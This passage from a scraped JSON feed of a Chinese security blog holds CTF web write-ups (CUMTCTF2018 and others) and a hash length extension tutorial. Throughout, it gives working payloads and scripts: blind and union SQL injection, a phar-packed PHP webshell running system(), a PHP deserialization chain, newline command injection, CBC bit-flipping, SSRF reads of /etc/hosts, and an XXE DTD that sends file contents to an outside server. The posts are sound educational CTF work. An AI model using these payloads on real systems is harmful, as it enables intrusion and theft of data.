下比较时会被转为int型可以参看PHP弱比较‘1asdas’会转为1‘asddsad’会转为0再看1select * from users where id='1'='' 返回id=1之外的所有数据 那么可以猜想：第二个等号后的数据决定了 返回id值的数据 or 返回这个id值以外的数据。尝试1234select * from users where id=''=1 // 无结果select * from users where id='1'=1 // 返回id=1select * from users where id='1'=ture//返回id=1select * from users where id='1'=false//返回id=1之外的所有 那么基本可以确定 id=1=0 中 0相当于后置参数它决定了返回的值，当语句仅为 id=1 时，其实默认了后置参数为1。123select * from users where id=1select * from users where id=1=1//两个语句是相同的 那么可以构造一些万能密码 ：1234'=false'='''='asdasdas'... 方法二大佬博客看来的构造语句爆破密码 ORZ123456789101112131415161718import requestsreq=requests.session()lists=\"0123456789abcdefghijklmnopqrstuvwxyz\"flag=''for i in range(50): url=\"http://182.254.247.127:2005/\" ok='' for s in lists: payload=&#123;\"username\":\"1'||passwd&lt;'\"+flag+s+\"'=id#\",\"passwd\":\"\"&#125; print payload r1=req.post(url,data=payload) if \"username\" in r1.text: ok=s else: flag+=ok print flag break post数据12username=1'||passwd&lt;'9989035e268342af1f40f26aad336623'=id#&amp;passwd=9989035e268342af1f40f26aad336623 得到flag 小电影首页提示ffmpegffmpeg的漏洞http://www.freebuf.com/column/142775.htmlexp : https://github.com/neex/ffmpeg-avi-m3u-xbin利用脚本读文件 SecurePY根据提示 知道使用python写的在 python-web 应用中，当前目录下， .py文件生成的pyc文件会被存储在 pycache文件夹中，并以 .cpython-XX.pyc 为扩展名，其中的 XX 与 CPython 版本有关。比如app.py，其对应的 pyc文件路径为 pycache/app.cpython-XX.pyc爆破得到xx为35访问http://123.206.83.157:8000/__pycache__/app.cpython-35.pyc得到源码123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env python# visit http://tool.lu/pyc/ for more informationfrom flask import Flask, request, jsonify, render_templatefrom Crypto.Cipher import AESfrom binascii import b2a_hex, a2b_heximport osapp = Flask(__name__)flag_key = os.environ['KEY']flag_enc = '9cf742955633f38d9c628bc9a9f98db042c6e4273a99944bc4cd150a0f7b9f317f52030329729ccf80798690667a0add'def index(): return render_template('index.html', flag_enc = flag_enc)index = app.route('/')(index)def getflag(): req = request.json if not req: return jsonify(result = False) if None not in req: return jsonify(result = False) key = req['key'] if len(key) != len(flag_key): return jsonify(result = False) for (x, y) in zip(key, flag_key): if ord(x) ^ ord(y): return jsonify(result = False) cryptor = AES.new(key, AES.MODE_CBC, b'0000000000000000') plain_text = cryptor.decrypt(a2b_hex(flag_enc)) flag = plain_text.decode('utf-8').strip() return jsonify(result = True, flag = flag)getflag = app.route('/getflag', methods = [ 'POST'])(getflag)if __name__ == '__main__': app.run() flag经过AES加密利用1&#123;\"key\":[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]&#125; 逐字爆破 如果正确会响应500最后得到key：5ecur3pPYpyPYk3y提交后得到flag。 BabyWrite存在文件包含 尝试都源码1http://120.24.215.80:10012/?page=php://filter/read=convert.base64-encode/resource=index 然后都login1http://120.24.215.80:10012/?page=php://filter/read=convert.base64-encode/resource=login 然后按照方方土的方法 ORZ利用phar协议构造zip压缩包将一个txt文件和php木马打包在一起，由于上传过程中会被插入 =&gt; ，txt文件保护了php文件，使木马可以正常被解压；上传文件后POST指令到PHP文件的位置1234POSTa=system('cat ../../../../d124abbe4cb6aa1621a8ca9519c0f5bf_flag.txt');到http://120.24.215.80:10012/?page=phar://./log/PK%03%04%0a.log/a 拿到flag BabyQuery抓包后看到查询语句1query=&#123; getscorebyid(id: \"GE======\")&#123; id name score &#125; &#125; ‘GE======’base32解码后是 1查询语句1query=&#123; getscorebyid(id: \"1\")&#123; id name score &#125; &#125; 改变结构后尝试注入1&#123; getscorebyyourname(name: \"1' or 'a'='a\")&#123; name score &#125; &#125; 成功 这里数据库是sqlite构造语句1&#123; getscorebyyourname(name: \"1' union select sqlite_version() --\")&#123; name score &#125; &#125; 成功返回版本信息暴表11' union select (select name from sqlite_master where type='table' limit 1,1) -- 查表11' union select (select flag from Secr3t_fl4g) -- ps:可以学习方方土学长写个脚本交互信息 方便很多附上脚本：12345678910import base64import requestsurl=\"http://182.254.247.127:3001/graphql\"payload = base64.b32encode(\"1' union select (select flag from Secr3t_fl4g) --\")go = '&#123; getscorebyyourname(name: \"%s\")&#123; name score &#125; &#125;'%(payload)data = &#123; \"query\" : go&#125;r = requests.post(data=data,url=url)print r.content /…","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"http://altman.vip/tags/wp/"}]},{"title":"CUMTCTF2018","slug":"CUMTCTF2018","date":"2018-01-13T16:00:00.000Z","updated":"2018-11-02T05:49:20.359Z","comments":true,"path":"2018/01/14/CUMTCTF2018/","link":"","permalink":"http://altman.vip/2018/01/14/CUMTCTF2018/","excerpt":"第一次真正意义打比赛和队友一起AK了web题很舒服","text":"第一次真正意义打比赛和队友一起AK了web题很舒服 WEB签到1右键源代码 签到2扫描目录发现robots.txt 打开http://qiandao.bxsteam.xyz/robots.txt 发现flag pop首页面给了源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?php @error_reporting(1); class sky &#123; protected $skyobj; function __construct() &#123; $this-&gt;skyobj = new sec; &#125; function __toString() &#123; if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); &#125; &#125; class nosec &#123; public $filename; function read() &#123; $file = \"./&#123;$this-&gt;filename&#125;\"; if (file_get_contents($file)) &#123; return file_get_contents($file); &#125; else &#123; return \"you must be joking!\"; &#125; &#125; &#125; class sec &#123; function read() &#123; return \"it's so sec~~\"; &#125; &#125; if (isset($_GET['data'])) &#123; $Input_data = unserialize($_GET['data']); echo $Input_data; &#125; else &#123; highlight_file(\"./index.php\"); &#125; ?&gt; 读代码可以想到我们的大致目标就是通过 调用__toString() 函数里的1return $this-&gt;skyobj-&gt;read(); 调动read()函数,读文件找flag。大概原理就是上传的data参数在被反序列化的过程中调用_construct()函数，然后直接输出对象引用时调用__toString()，调动read()达到我们的目的。 直接贴代码1234567891011121314151617181920212223242526272829303132333435&lt;?phpclass sky&#123; protected $skyobj; function __construct() &#123; $this-&gt;skyobj = new nosec(); &#125; function __toString() &#123; if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); &#125;&#125;class nosec&#123; public $filename='flag.php'; function read() &#123; $file = \"./&#123;$this-&gt;filename&#125;\"; if (file_get_contents($file)) &#123; return file_get_contents($file); &#125; else &#123; return \"you must be joking!\"; &#125; &#125;&#125;$aa = new sky();$aa= urlencode(serialize($aa));echo $aa; \\$aa就是构造的data参数。（一定要转url编码！坑！） 把data POST上去flag就出来了。 what？php混淆，解就行了。。没啥说的 解出来的关键代码如下12345678910$IIIIIIIIIIll = @$_GET['img_tet']; $IIIIIIIIIIll = htmlspecialchars($IIIIIIIIIIll); $IIIIIIIIIIll = str_replace('flag', \"\", $IIIIIIIIIIll);if ($IIIIIIIIIIll != \"\") &#123; header('Content-Type: imgage/jpeg'); header('Content-Disposition: attachment; filename='.$IIIIIIIIIIll); header(Content-Lengh: .filesize($IIIIIIIIIIll)); $IIIIIIIIII11 = fopen($IIIIIIIIIIll, \"r\") or die(\"Unable to open file!\"); $IIIIIIIIIlIl = fread($IIIIIIIIII11, filesize($IIIIIIIIIIll)); fclose($IIIIIIIIII11); echo $IIIIIIIIIlIl;&#125; 过滤了flag，用flflagag绕过。 最终payload：1http://confuse.bxsteam.xyz?img_tet=%2f%74%6d%70%2f%66%6c%66%6c%61%67%61%67 rce先fuzz了一波，没发现怎么利用，提示换行后fuzz，还是不会。 最后发现了用uniq 和sort指令都能做出来 %0a换行，%09绕过空格。用通配符 ‘?’ 爆破文件这里直接贴上python脚本123456789101112#! /usr/bin/python2.7import requestsimport urlliburl='http://rce.bxsteam.xyz/index.php'payload=urllib.unquote('%0auniq%09.%3f')for i in range(1,40): payload=urllib.unquote(urllib.quote(payload)+'%3f') data=&#123; \"rce\":payload &#125; r=requests.post(url=url,data=data) print r.content 其中把uniq换成sort也可以。 skysqlsky的sql是真的难。 刚开始想通过：1?id=0'||(select user() like '%')||'0 构造 1 然后通配符逐字爆破。。结果发get不到列名。。就卡住了 提示用联合查询 ，union select 用 union all select select 1，2等价于 select * from ((select 1)A join (select 2)B) 构造出来payload1?id=0' union all select * from ((select 1)A join (select 2)B)%23 但还是找不到列名，百度到大佬的博客讲不用列名的奇淫技巧。。http://www.blogsir.com.cn/safe/495.htmllimit(0,1) 用 limit 1 offset 0构造payload：1?id=0' union all select * from ((select 1)A join (select F.1 from (select * from (select 1)C join (select 2)D join (select 3)E join (select 4)F union all select * from flag limit 1 offset 1)F)B)%23 F.n读取第n列 最终在第四列读到flag1http://skysql.bxsteam.xyz/?id=0' union all select * from ((select 1)A join (select F.4 from (select * from (select 1)C join (select 2)D join (select 3)E join (select 4)F union all select * from flag limit 1 offset 1)F)B)%23 login首先发现源码http://cbc.bxsteam.xyz/login.php~分析后得知是CBC反转攻击。不懂看这里（http://zjw.dropsec.xyz/CTF/2017/04/24/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB.html）不能直接用admin登陆，需要我们更改cipher和token以达到用admin登陆的目的。我们用1dmin和任意密码登陆 得到cipher和token的值这里进行CBC反转攻击，得到新的cipher和token值python脚本如下：123456789101112131415161718# coding=utf-8import base64import urllibiv = base64.b64decode(\"cFvSSjVIp+Uh22ERLFjaUQ==\")plain = base64.b64decode(\"wPiTIz61Ge31LPnnlD1aym1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE6IjEiO30=\")want = 'a:2:&#123;s:8:\"userna'#print(want[0])first_16 = ''for i in range(16): print i,plain[i],iv[i],want[i] print chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i])) first_16 += chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))new_iv = first_16 + iv[16:]print(base64.b64encode(new_iv))print(first_16) 传入网页后成功跳转到amdin界面1http://cbc.bxsteam.xyz/admin.php?url=http://skysec.top/ 默认访问了方方土的博客。。。。显然是SSRF我们直接读取host1http://cbc.bxsteam.xyz/admin.php?url=File:///etc/hosts 得到ip：172.17.0.4访问1cbc.bxsteam.xyz/admin.php?url=172.17.0.4 发现页面源码，明显的文件包含漏洞 直接读取flag.php1http://cbc.bxsteam.xyz/admin.php?url=172.17.0.4/?file=php://filter/read=convert.base64-encode/resource=flag.php 得到base64后的flag.php，解码得到flag。 Xxexxe是什么 打开题目很清楚就是xxe 直接写题解了首先vps放文件file.dtd,内容如下：12&lt;!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///etc/hosts\"&gt;&lt;!ENTITY % int \"&lt;!ENTITY &amp;#37; trick SYSTEM 'http://104.236.236.145/?p=%payl;'&gt;\"&gt; 漏洞处payload1&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM \"http://104.236.236.145/file.dtd\"&gt;%remote;%int;%trick;]&gt; 查看服务器log(nginx一般在var/log/nginx/access.log)158.218.185.110 - - [14/Jan/2018:08:16:55 +0000] \"GET /?p=(省略一大串) HTTP/1.0\" 200 3 \"-\" \"-\" base64解码12345678910127.0.0.1 localhost::1 localhost ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters172.17.0.6 flag 5e8af79b12ae xxessrf_flag_1172.17.0.6 flag_1 5e8af79b12ae xxessrf_flag_1172.17.0.6 xxessrf_flag_1 5e8af79b12ae172.17.0.7 74791d7ac29b 嗯？？？？还有一层？？？接着继续读下index123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt; &lt;title&gt;XML&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"./bootstrap.min.css\"&gt; &lt;script src=\"./jquery.min.js\"&gt;&lt;/script&gt; &lt;script src=\"./bootstrap.min.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form role=\"form\" id=\"form\" method=\"POST\" action=\"index.php\"&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"name\"&gt;XML&lt;/label&gt; &lt;textarea class=\"form-control\" rows=\"6\" name=\"data\" placeholder=\"&lt;code&gt; &lt;body&gt;Hello World!&lt;/body&gt;&lt;/code&gt; \"&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;div class=\"btn-group\"&gt; &lt;button type=\"button\" class=\"btn btn-default\" onclick=\"document.getElementById('form').submit()\"&gt;SUBMIT&lt;/button&gt; &lt;/div&gt; &lt;?php error_reporting(0); include(\"flag.php\"); if(isset($_POST['data']) and $_POST['data'] != \"\") &#123; $xml = simplexml_load_string($_POST['data'], null, LIBXML_NOENT); &#125; ?&gt; &lt;/form&gt; 哦？？圈住include(“flag.php”),尝试直接读,没反应,想着也应该,还有提示SSRF至此,上午工作基本结束,剩下持续发呆直到下午……xxessrf???开始探测内网端口….从8080…..到2018…..嗯中途放弃了…..最后又拿了起来,在队友群又发一下hosts截图 你那个172.17.0.7是啥? …….docker,内网读取flag12&lt;!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=http://172.17.0.6/?file=php://filter/read=convert.base64-encode/resource=flag.php\"&gt;&lt;!ENTITY % int \"&lt;!ENTITY &amp;#37; trick SYSTEM 'http://104.236.236.145/?p=%payl;'&gt;\"&gt; 1UEQ5d2FIQWdDaTh2WldOb2J5QWlZM1Z0ZEdOMFpudENNV2x1TTE5NGVETmZZVzVrWDNOemNtWmZNWE5mUTI5dmJEOTlJanNLUHo0S0NnPT0= … &lt;?php//echo “cumtctf{B1in3_xx3_and_ssrf_1s_Cool?}”;?&gt;","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"http://altman.vip/tags/wp/"}]},{"title":"哈希长度拓展攻击","slug":"hash长度扩展攻击","date":"2017-12-19T16:00:00.000Z","updated":"2018-11-02T05:49:02.387Z","comments":true,"path":"2017/12/20/hash长度扩展攻击/","link":"","permalink":"http://altman.vip/2017/12/20/hash长度扩展攻击/","excerpt":"实验吧看到的题，之前觉得很难最近有空再做一次记录一下学习过程","text":"实验吧看到的题，之前觉得很难最近有空再做一次记录一下学习过程 0x01 hash函数原理网上有很多讲解，大概就是将明文分为n个区块，在进行多轮运算。大部分明文不能被区块长度整除，所以必须被padding至区块长度的整数倍。然后进行n次运算后得到密文。 0x02 攻击方式当key未知，key的位数已知，md5(key)已知。那么可以求出md5(key+”填充数据”+”任意数据”)。通过一道实验吧的题来理解。源码如下12345678910111213141516171819202122232425262728293031$flag = \"XXXXXXXXXXXXXXXXXXXXXXX\";$secret = \"XXXXXXXXXXXXXXX\"; // This secret is 15 characters long for security!$username = $_POST[\"username\"];$password = $_POST[\"password\"];if (!empty($_COOKIE[\"getmein\"])) &#123; if (urldecode($username) === \"admin\" &amp;&amp; urldecode($password) != \"admin\") &#123; if ($COOKIE[\"getmein\"] === md5($secret . urldecode($username . $password))) &#123; echo \"Congratulations! You are a registered user.\\n\"; die (\"The flag is \". $flag); &#125; else &#123; die (\"Your cookies don't match up! STOP HACKING THIS SITE.\"); &#125; &#125; else &#123; die (\"You are not an admin! LEAVE.\"); &#125;&#125;setcookie(\"sample-hash\", md5($secret . urldecode(\"admin\" . \"admin\")), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[\"source\"])) &#123; setcookie(\"source\", 0, time() + (60 * 60 * 24 * 7));&#125;else &#123; if ($_COOKIE[\"source\"] != 0) &#123; echo \"\"; // This source code is outputted here &#125;&#125; 要满足要求1$COOKIE[\"getmein\"] === md5($secret . urldecode($username . $password)) 知道了$secret的位数，通过cookie得知md5($secret+admin)=571580b26c65f306376d4f64e53cb5c7。那么通过hash拓展攻击可以满足上面的要求。首先将$secret+admin填充至512bits，然后在加上任意数据例如altman得到新的值X，这里将X进行hash运算，分为两组进行两轮运算。第一组运算md5($secret+admin+填充值)，会发现他与已知md5($secret+admin)相同，那么我们直接利用md5($secret+admin)得到第一轮运算结果。然后通过第一轮运算结果得到第二轮结果，这样我们就在不知道$secret值的情况下算出了md5($secret+admin+”填充值”+”任意数据”)。构造123username=adminpassword=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00altmancookie:getmein=10a4b3dc8626cb07d24bda61be701b9f 成功绕过了1$COOKIE[\"getmein\"] === md5($secret . urldecode($username . $password)) 拿到flag /。 0x03 攻击脚本github有好几个攻击脚本，但是试了试感觉都太麻烦。发现github有个攻击工具很好用。HashPump简单说下安装(linux)12345git clone https://github.com/bwall/HashPumpapt-get install g++ libssl-devcd HashPumpmakemake install 用起来很简单12345# hashpumpInput Signature: 571580b26c65f306376d4f64e53cb5c7 //(已知的hash值)Input Data: adminInput Key Length: 20 //($secret 15位+admin 5位)Input Data to Add: altman //添加的任意数据 然后就会得到payload：1210a4b3dc8626cb07d24bda61be701b9f //md5($secret+admin+passwd)admin\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc8\\x00\\x00\\x00\\x00\\x00\\x00\\x00altman //构造的passwd 0x04 当无法获取密钥长度时只能通过脚本爆破了，正确的长度会返回不一样的报错信息。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]}]}